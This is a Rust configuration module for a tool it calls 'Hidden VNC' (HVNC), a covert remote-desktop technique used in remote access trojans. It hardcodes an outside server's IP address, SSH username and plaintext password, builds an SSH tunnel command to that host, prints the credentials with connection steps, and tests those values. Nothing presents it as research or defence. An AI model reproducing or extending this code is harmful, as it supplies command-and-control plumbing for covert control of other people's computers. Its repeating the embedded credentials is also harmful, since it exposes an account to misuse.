//! Default configuration and credentials for Hidden VNC
//! 
//! This module contains the centralized configuration that can be updated
//! in one place to change server credentials and connection details.

/// Default server configuration - UPDATE THESE VALUES AS NEEDED
pub struct DefaultServerConfig {
    pub host: &'static str,
    pub ssh_port: u16,
    pub username: &'static str,
    pub password: &'static str,
    pub hvnc_port: u16,
    pub tunnel_port: u16,
}

/// Centralized server credentials - SINGLE POINT OF CONFIGURATION
pub const DEFAULT_SERVER: DefaultServerConfig = DefaultServerConfig {
    host: "146.190.74.86",
    ssh_port: 22,
    username: "tunneluser",
    password: "EuroFw19@a03ee",
    hvnc_port: 5900,
    tunnel_port: 3390,
};

/// Generate SSH tunnel command with default credentials
pub fn get_default_tunnel_command() -> String {
    format!("ssh -L {}:127.0.0.1:{} {}@{}", 
            DEFAULT_SERVER.tunnel_port,
            DEFAULT_SERVER.hvnc_port,
            DEFAULT_SERVER.username,
            DEFAULT_SERVER.host)
}

/// Generate connection info with default credentials
pub fn get_default_connection_info() -> crate::client::ConnectionInfo {
    crate::client::ConnectionInfo {
        host: DEFAULT_SERVER.host.to_string(),
        ssh_port: DEFAULT_SERVER.ssh_port,
        username: DEFAULT_SERVER.username.to_string(),
        password: Some(DEFAULT_SERVER.password.to_string()),
        local_tunnel_port: DEFAULT_SERVER.tunnel_port,
        remote_hvnc_port: DEFAULT_SERVER.hvnc_port,
    }
}

/// Display default connection information
pub fn display_default_connection_info() {
    println!("\n=== Default HVNC Connection Information ===");
    println!("Host: {}", DEFAULT_SERVER.host);
    println!("SSH Port: {}", DEFAULT_SERVER.ssh_port);
    println!("Username: {}", DEFAULT_SERVER.username);
    println!("Password: {}", DEFAULT_SERVER.password);
    println!("\nTo connect from client:");
    println!("1. Establish SSH tunnel:");
    println!("   {}", get_default_tunnel_command());
    println!("2. Connect HVNC client:");
    println!("   hvnc-client --server 127.0.0.1:{}", DEFAULT_SERVER.tunnel_port);
    println!("==========================================\n");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        assert_eq!(DEFAULT_SERVER.host, "146.190.74.86");
        assert_eq!(DEFAULT_SERVER.username, "tunneluser");
        assert_eq!(DEFAULT_SERVER.ssh_port, 22);
    }

    #[test]
    fn test_tunnel_command_generation() {
        let cmd = get_default_tunnel_command();
        assert!(cmd.contains("146.190.74.86"));
        assert!(cmd.contains("tunneluser"));
        assert!(cmd.contains("3390:127.0.0.1:5900"));
    }
}